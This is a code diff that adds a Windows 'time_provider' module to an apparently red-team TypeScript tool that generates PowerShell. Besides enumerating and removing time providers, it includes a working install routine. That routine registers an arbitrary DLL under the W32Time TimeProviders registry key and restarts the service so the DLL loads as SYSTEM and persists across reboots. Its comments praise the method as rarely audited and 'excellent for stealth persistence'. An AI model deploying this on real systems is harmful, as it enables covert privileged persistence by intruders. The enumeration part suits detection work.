@@ -24748,6 +24748,164 @@ Write-Output "[+] Netsh helper '${name}' removed"
   return { output: output.join("\n"), findings }
 }
 
+async function timeProvider(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "enum"
+  const dll = argVal(args, "--dll")
+  const providerName = argVal(args, "--name") || "CyberStrikeTimeProvider"
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Windows Time Provider DLL Persistence...\n"]
+
+  const regBase = "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders"
+
+  if (action === "enum") {
+    const script = `
+Write-Output "=== W32Time Service Status ==="
+$svc = Get-Service W32Time -ErrorAction SilentlyContinue
+Write-Output "[*] Service: $($svc.DisplayName)"
+Write-Output "[*] Status: $($svc.Status)"
+Write-Output "[*] StartType: $($svc.StartType)"
+Write-Output ""
+
+Write-Output "=== Registered Time Providers ==="
+$providers = Get-ChildItem '${regBase}' -ErrorAction SilentlyContinue
+$suspiciousCount = 0
+foreach ($p in $providers) {
+  $props = Get-ItemProperty $p.PSPath
+  $dllPath = $props.DllName
+  $enabled = $props.Enabled
+  $inputProvider = $props.InputProvider
+
+  Write-Output "  $($p.PSChildName)"
+  Write-Output "    DllName: $dllPath"
+  Write-Output "    Enabled: $(if ($enabled -eq 1) { 'Yes' } else { 'No' })"
+  Write-Output "    InputProvider: $(if ($inputProvider -eq 1) { 'Yes' } else { 'No' })"
+
+  # Check if it's a known Microsoft provider
+  $known = @('NtpClient', 'NtpServer', 'VMICTimeProvider')
+  if ($p.PSChildName -notin $known) {
+    Write-Output "    [!] NON-STANDARD provider"
+    $suspiciousCount++
+  }
+
+  if ($dllPath) {
+    $exists = Test-Path $dllPath -ErrorAction SilentlyContinue
+    if (-not $exists) {
+      Write-Output "    [!] DLL not found at path"
+    } else {
+      $sig = Get-AuthenticodeSignature $dllPath -ErrorAction SilentlyContinue
+      if ($sig.Status -ne 'Valid') {
+        Write-Output "    [!] DLL is UNSIGNED"
+        $suspiciousCount++
+      }
+    }
+  }
+  Write-Output ""
+}
+
+Write-Output "SUSPICIOUS_COUNT=$suspiciousCount"
+Write-Output ""
+Write-Output "[*] Time providers run as SYSTEM in svchost.exe (W32Time service)"
+Write-Output "[*] Default providers: NtpClient, NtpServer, VMICTimeProvider (Hyper-V)"
+Write-Output "[*] Custom providers are rarely audited — excellent for stealth persistence"
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+
+    const suspMatch = r.stdout.match(/SUSPICIOUS_COUNT=(\d+)/)
+    if (suspMatch && parseInt(suspMatch[1]) > 0) {
+      findings.push({
+        checkId: "WIN-TIME-001",
+        provider: "windows",
+        severity: "high",
+        status: "SUSPICIOUS",
+        resource: "registry://w32time",
+        title: `${suspMatch[1]} suspicious time provider(s) detected`,
+        details: "Non-standard or unsigned time provider DLLs may indicate persistence.",
+        remediation: "Remove suspicious entries from W32Time\\TimeProviders registry.",
+      })
+    }
+  }
+
+  if (action === "install") {
+    if (!dll) {
+      output.push("ERROR: --dll required (path to time provider DLL)")
+      output.push("")
+      output.push("Usage: winhook time_provider --action install --dll C:\\path\\provider.dll [--name MyProvider]")
+      output.push("")
+      output.push("[*] DLL must export TimeProvOpen, TimeProvCommand, TimeProvClose")
+      output.push("[*] Runs as SYSTEM in svchost.exe (W32Time service group)")
+      output.push("[*] Survives reboots, loads on service start")
+      return { output: output.join("\n"), findings }
+    }
+
+    const script = `
+Write-Output "=== Installing Time Provider ==="
+Write-Output "Name: ${providerName}"
+Write-Output "DLL: ${dll}"
+Write-Output ""
+
+$provPath = '${regBase}\\${providerName}'
+New-Item -Path $provPath -Force | Out-Null
+Set-ItemProperty $provPath -Name DllName -Value '${dll}' -Type String
+Set-ItemProperty $provPath -Name Enabled -Value 1 -Type DWord
+Set-ItemProperty $provPath -Name InputProvider -Value 1 -Type DWord
+
+Write-Output "[+] Time provider registered"
+Write-Output ""
+
+# Restart W32Time to load the new provider
+Restart-Service W32Time -Force -ErrorAction SilentlyContinue
+$svc = Get-Service W32Time
+Write-Output "[*] W32Time service status: $($svc.Status)"
+Write-Output ""
+Write-Output "[+] Provider DLL loaded in SYSTEM context"
+Write-Output "[*] Persists across reboots (service auto-start)"
+Write-Output ""
+Write-Output "Remove: winhook time_provider --action remove --name ${providerName}"
+Write-Output "STATUS=SUCCESS"
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+
+    if (r.stdout.includes("STATUS=SUCCESS")) {
+      findings.push({
+        checkId: "WIN-TIME-010",
+        provider: "windows",
+        severity: "critical",
+        status: "PERSISTED",
+        resource: `w32time://${providerName}`,
+        title: `Time provider persistence installed: ${providerName} → ${dll}`,
+        details: "DLL runs as SYSTEM in W32Time service. Survives reboots, rarely audited.",
+        remediation: `Remove: winhook time_provider --action remove --name ${providerName}`,
+      })
+    }
+  }
+
+  if (action === "remove") {
+    const name = argVal(args, "--name")
+    if (!name) {
+      output.push("ERROR: --name required (provider name to remove)")
+      return { output: output.join("\n"), findings }
+    }
+
+    const script = `
+$provPath = '${regBase}\\${name}'
+if (Test-Path $provPath) {
+  Remove-Item $provPath -Recurse -Force
+  Write-Output "[+] Time provider '${name}' removed"
+  Restart-Service W32Time -Force -ErrorAction SilentlyContinue
+  Write-Output "[+] W32Time service restarted"
+} else {
+  Write-Output "[-] Provider '${name}' not found"
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
 // ── Dispatch ──
 
 async function privilegeAbuse(args: string[], timeout: number): Promise<HookResult> {
@@ -28395,6 +28553,7 @@ const dispatch: Record<Program, (args: string[], timeout: number) => Promise<Hoo
   winlogon_persist: winlogonPersist,
   appinit_dll: appinitDll,
   netsh_helper: netshHelper,
+  time_provider: timeProvider,
 }
 
 export const WinhookTool = Tool.define("winhook", {
